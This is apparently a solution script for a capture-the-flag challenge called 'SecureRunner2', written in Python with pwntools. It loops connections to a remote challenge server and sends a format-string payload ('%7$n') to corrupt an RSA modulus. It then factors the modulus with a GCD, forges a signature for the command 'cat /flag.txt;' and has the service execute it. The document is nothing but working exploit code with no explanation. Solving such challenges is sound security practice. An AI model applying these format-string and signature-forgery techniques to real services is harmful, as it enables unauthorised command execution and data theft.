from Crypto.Util.number import *
from pwn import *

while True:
    r = remote('eca189e9.sstf.site', 1337)
    # r = process('./SecureRunner2')

    r.sendlineafter(b'> ', b'2')
    r.recvuntil(b'n = ')
    n = int(r.recvline().strip().decode())
    r.recvuntil(b'e = ')
    e = int(r.recvline().strip().decode())

    r.sendlineafter(b'> ', b'9999')
    r.sendline(b'-2723\n%7$n')

    r.sendlineafter(b'> ', b'0')
    r.recvuntil(b'it\'s  ')
    n2 = int(r.recvline().strip().decode())

    p = GCD(n, n2)
    assert n % p == 0
    q_ = n2 // p
    
    print(hex(q_ >> 8))
    if not isPrime(q_ >> 8):
        r.close()
        continue
    
    q_ >>= 8
    assert p * q_ * 256 == n2

    # n = 2^8 * p * q
    # phi(n) = 2^7 * (p - 1) * (q - 1)
    phi = 128 * (p - 1) * (q_ - 1)
    d = inverse(e, phi)

    # assert pow(pow(3, e, n2), d, n2) == 3

    cmd = b'cat /flag.txt;'
    res = pow(bytes_to_long(cmd), d, n2)

    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'> ', cmd)
    r.sendlineafter(b'> ', str(res).encode())

    r.interactive()